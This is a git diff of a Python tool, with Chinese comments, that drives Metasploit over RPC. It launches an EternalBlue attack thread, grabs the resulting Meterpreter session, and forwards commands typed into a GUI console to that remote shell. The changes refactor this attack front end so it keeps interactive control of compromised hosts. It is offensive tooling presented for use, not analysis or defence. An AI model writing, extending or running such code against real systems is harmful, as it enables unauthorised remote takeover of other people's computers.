@@ -4,7 +4,7 @@ import threading
 from typing import Callable
 
 import pymetasploit3.msfrpc
-from pymetasploit3.msfrpc import MsfRpcClient
+from pymetasploit3.msfrpc import MsfRpcClient, MeterpreterSession
 
 from libs.GUI import GUI
 from libs.Logger import Logger
@@ -15,6 +15,7 @@ client: MsfRpcClient = None
 logger = Logger('Main')
 gui = GUI('My Console')
 stop_funcs: list[Callable] = []
+shell: MeterpreterSession
 
 
 @gui.event
@@ -32,13 +33,12 @@ def on_input_line(gui, text):
 
     # 顯示輸入內容
     gui.println(f'$ {text}')
-
+    global shell
     # 傳送指令
-    shell = client.sessions.session(list(client.sessions.list.keys())[0])
     shell.write(text)
 
 
-async def connect_rpc():
+def connect_rpc():
     try:
         logger.info('正在連線到 RPC...')
         global client
@@ -52,6 +52,7 @@ async def connect_rpc():
         sys.exit(1)
 
 
+# Must be async
 async def attack():
     """
     異步攻擊線程
@@ -66,11 +67,16 @@ async def attack():
     # stop_funcs.append(smb_delivery.stop)
 
     @eternal_blue.event
-    async def on_read(text):
+    def on_read(text):
         gui.println(text)
 
+    @eternal_blue.event
+    def on_session_created(session_id):
+        global shell
+        shell = client.sessions.session(session_id)
+
     # @smb_delivery.event
-    # async def on_read(text):
+    # def on_read(text):
     #     gui.println(text)
 
     await asyncio.gather(
@@ -81,12 +87,12 @@ async def attack():
 
 async def main():
     # 建立客戶端
-    await connect_rpc()
+    connect_rpc()
 
     attack_thread = threading.Thread(target=lambda: asyncio.run(attack()))
     attack_thread.start()
 
-    await gui.build()
+    gui.build()
 
     logger.info('正在關閉...')
     for func in stop_funcs:
